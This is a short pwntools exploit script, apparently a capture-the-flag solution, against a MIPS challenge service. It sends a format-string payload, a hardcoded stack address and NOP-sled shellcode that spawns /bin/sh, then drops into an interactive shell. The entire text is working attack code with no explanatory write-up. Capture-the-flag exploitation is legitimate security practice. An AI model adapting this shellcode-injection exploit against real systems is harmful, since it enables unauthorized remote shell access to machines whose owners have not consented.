from pwn import *

context(arch='mips', bits=32, endian='big')

io = remote('0.cloud.chals.io', 12490)
#io = process(['qemu-mips-static', '-L', '.', './chall'])
#io = gdb.debug(args=['-L','.','./chall'], exe='./chall', env={},  gdbscript='''
#        break *main
#        break *main+88
#        break *0x2b2ab1c4
#
#        ''')


shellcode = asm(shellcraft.nop()) * 20
shellcode += asm(shellcraft.sh())

shellcode_len = len(shellcode)

print(hexdump(shellcode))
print(len(shellcode))


stack_addr = p32(0x2b2abf54)
io.sendline(b'%6$5c%1$'+ str(shellcode_len).encode() + b'c')
io.sendline(stack_addr)
io.sendline(shellcode)
io.sendline(b'D'*100)

io.interactive()

